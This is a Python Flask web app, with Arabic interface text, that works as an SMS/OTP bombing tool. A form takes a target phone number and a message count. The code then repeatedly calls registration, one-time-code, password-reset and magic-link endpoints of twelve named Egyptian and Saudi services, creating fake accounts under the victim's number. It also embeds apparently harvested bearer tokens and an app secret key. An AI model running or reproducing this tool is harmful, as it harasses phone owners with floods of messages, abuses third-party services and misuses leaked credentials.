from flask import Flask, request
import requests
import json

app = Flask(__name__)

# وظيفة لإرسال الطلبات
def send_requests(phone_number, num_messages, random_chars):
    results = []

    for i in range(num_messages):
        # 1. Filkhedma Register
        url = "https://api.filkhedma.net/v2/customer/register"
        payload = json.dumps({
            "email": f"{random_chars}n14@gmail.com",
            "firstName": "elgzar",
            "lastName": "alguhanmy",
            "mobile": phone_number,
            "password": "Ah123@@@",
            "registerFlow": "simple"
        })
        headers = {
            'User-Agent': "okhttp/3.14.9",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'filkhedma-channel': "app-android",
            'X-Filkhedma-TenantId': "",
            'X-Filkhedma-CurrentLocale': "ar"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Filkhedma Register {i+1}: {response.status_code} - {response.text}")

        # 2. Almasry Pharmacy Register
        url = "https://backend.almasrypharmacy.com/rest/V1/customers"
        payload = json.dumps({
            "firstname": "alguhanmy",
            "lastname": "alguhanmy",
            "mobile": phone_number,
            "password": "Ahmed123",
            "confirmPassword": "Ahmed123",
            "email": f"{random_chars}r4@gmail.com"
        })
        headers = {
            'User-Agent': "Dart/3.5 (dart:io)",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'authorization': "Bearer keumzev3zd1migwbsdgjpbfl3rcakyd9",
            'sentry-trace': "18dbe27861ce4f7d91fcb85821069c8c-3e8f0f3665844710"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Almasry Pharmacy Register {i+1}: {response.status_code} - {response.text}")

        # 3. Epoints Register
        url = "http://tws.e-points.net/EpointsMobileService/EpointsMobileService/MobileRegister"
        payload = json.dumps({
            "Address": "كةمهىخهىى نةن ةةن خةخىخىخ",
            "CarBrandId": 0,
            "CellPhoneNumber": phone_number,
            "City": "1013",
            "CloneID": 62,
            "College": 0,
            "CountryID": 7,
            "Dateofbirth": "1995/12/18",
            "EmailAddress": f"{random_chars}4@gmail.com",
            "FirstName": "Alguhanmy",
            "Gender": "ذكر",
            "LanguageID": 2,
            "Lastname": "Alguhanmy",
            "LicenseNo": "",
            "Nationality": "0",
            "NationalID": "",
            "Password": "الجزار",
            "YearOfManufacturer": "",
            "Zip": "",
            "Random": 1734673770270
        })
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': "gzip, deflate",
            'Content-Type': "application/json",
            'X-Requested-With': "com.epoints.eg.kapci",
            'Accept-Language': "en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Epoints Register {i+1}: {response.status_code} - {response.text}")

        # 4. Epoints Forget Password
        url = "http://tws.e-points.net/EpointsMobileService/EpointsMobileService/ForgetCardholderPassword"
        payload = json.dumps({
            "CloneID": 62,
            "CountryID": 7,
            "LanguageID": 2,
            "Username": phone_number,
            "Random": 1734673220462
        })
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': "gzip, deflate",
            'Content-Type': "application/json",
            'X-Requested-With': "com.epoints.eg.kapci",
            'Accept-Language': "en-GB,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-US;q=0.6"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Epoints Forget Password {i+1}: {response.status_code} - {response.text}")

        # 5. Mwasla Verify
        url = "https://mmapi.mwasla.tech/api/v1/authentication/verify"
        params = {
            'phone': f"+2{phone_number}"
        }
        headers = {
            'User-Agent': "android",
            'Accept-Encoding': "gzip",
            'authorization': "token=",
            'accept-language': "en"
        }
        response = requests.post(url, params=params, headers=headers)
        results.append(f"Mwasla Verify {i+1}: {response.status_code} - {response.text}")

        # 6. Mwsla Request OTP
        url = "https://app.mwsla.co/api/requestotp"
        payload = json.dumps({
            "MobileNo": phone_number
        })
        headers = {
            'User-Agent': "okhttp/4.9.2",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Mwsla Request OTP {i+1}: {response.status_code} - {response.text}")

        # 7. Bluebus Get Customer Code
        url = "https://api.bluebus.com.eg/graphql/"
        payload = json.dumps({
            "operationName": "getCustomerCode",
            "variables": {
                "phone": phone_number
            },
            "query": "query getCustomerCode($phone:String!) { getCustomerCode(phone: $phone) { __typename status message data { __typename expiry_date } } }"
        })
        headers = {
            'User-Agent': "okhttp/4.9.1",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-apollo-operation-id': "921b6f7aa4b3ecab903aafcf86a84a8025525ada176bda3753ba6fab5e679ccc",
            'x-apollo-operation-name': "getCustomerCode",
            'x-apollo-cache-key': "d1914ec034691789fd308cb980367750",
            'x-apollo-cache-fetch-strategy': "NETWORK_ONLY",
            'x-apollo-expire-timeout': "0",
            'x-apollo-expire-after-read': "false",
            'x-apollo-prefetch': "false",
            'x-apollo-cache-do-not-store': "false",
            'source': "android",
            'lang': "en"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Bluebus Get Customer Code {i+1}: {response.status_code} - {response.text}")

        # 8. Almasry Pharmacy Forget Password
        url = "https://backend.almasrypharmacy.com/rest/V1/auth/forget-password"
        payload = json.dumps({
            "identity": phone_number
        })
        headers = {
            'User-Agent': "Dart/3.5 (dart:io)",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'authorization': "Bearer keumzev3zd1migwbsdgjpbfl3rcakyd9",
            'sentry-trace': "18dbe27861ce4f7d91fcb85821069c8c-3e8f0f3665844710"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Almasry Pharmacy Forget Password {i+1}: {response.status_code} - {response.text}")

        # 9. Seha Send Code
        url = "https://seha-app.com/api/users/send_code"
        payload = f'mobile_or_email={phone_number}&lang=ar'
        headers = {
            'User-Agent': "okhttp/4.9.0",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/x-www-form-urlencoded"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Seha Send Code {i+1}: {response.status_code} - {response.text}")

        # 10. Filkhedma Login By Magic Link
        url = "https://api.filkhedma.net/v2/customer/loginByMagicLink"
        payload = json.dumps({
            "username": phone_number
        })
        headers = {
            'User-Agent': "okhttp/3.14.9",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'filkhedma-channel': "app-android",
            'X-Filkhedma-TenantId': "",
            'X-Filkhedma-CurrentLocale': "ar"
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Filkhedma Login By Magic Link {i+1}: {response.status_code} - {response.text}")

        # 11. Gourmet Egypt Send Mobile OTP
        url = "https://gourmetegypt.com/graphql"
        payload = json.dumps({
            "operationName": "sendMobileOtp",
            "variables": {
                "phoneNumber": f'+2{phone_number}'
            },
            "query": "mutation sendMobileOtp($phoneNumber: String!) { sendMobileOtp(input: { mobile_number: $phoneNumber } ) { message mobile_number otp_timeout pinId result } }"
        })
        headers = {
            'User-Agent': "okhttp/5.0.0-alpha.7",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/json",
            'x-apollo-operation-id': "318007172de9381fd791be366362c37badd567adc871367b1629fd3f4a2b5999",
            'x-apollo-operation-name': "sendMobileOtp",
            'x-apollo-cache-fetch-policy': "NETWORK_ONLY",
            'store': "gourmet_egypt_english",
            'authorization': "Bearer",
            'location': ""
        }
        response = requests.post(url, data=payload, headers=headers)
        results.append(f"Gourmet Egypt Send Mobile OTP {i+1}: {response.status_code} - {response.text}")

        # 12. Alcoupon Send OTP
        url = "https://images.alcoupon.com/symfony4/api/api_secure.php"
        params = {
            'device_id': "07430cda0a9b2131",
            'device_description': "SM-G610F",
            'device_type': "android",
            'os_version': "8.1.0",
            'device_lang': "en_GB",
            'sk1': "ALCSECjm7HJK33@SK1",
            'app_version': "2.0.94",
            'app_native_version': "2.0.94",
            'debug': "true",
            'lang': "en",
            'country': "sa",
            'module': "user",
            'method': "user_send_otp_mobile",
            'data': "empty",
            'filter1': f"%2B2{phone_number}"
        }
        headers = {
            'User-Agent': "okhttp/4.9.2",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip, deflate"
        }
        response = requests.get(url, params=params, headers=headers)
        results.append(f"Alcoupon Send OTP {i+1}: {response.status_code} - {response.text}")

    return results

# الصفحة الرئيسية
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        num_messages = int(request.form['num_messages'])
        random_chars = request.form['random_chars']

        results = send_requests(phone_number, num_messages, random_chars)

        # عرض النتائج كـ HTML بسيط
        response = "<h1>النتائج:</h1><ul>"
        for result in results:
            response += f"<li>{result}</li>"
        response += "</ul>"
        return response

    # عرض نموذج الإدخال
    return '''
        <form method="POST">
            <label for="phone_number">رقم الهاتف:</label><br>
            <input type="text" id="phone_number" name="phone_number" required><br><br>
            <label for="num_messages">عدد الرسائل:</label><br>
            <input type="number" id="num_messages" name="num_messages" required><br><br>
            <label for="random_chars">أحرف عشوائية:</label><br>
            <input type="text" id="random_chars" name="random_chars" required><br><br>
            <input type="submit" value="إرسال">
        </form>
    '''

# تشغيل التطبيق
if __name__ == '__main__':
    app.run(debug=True)
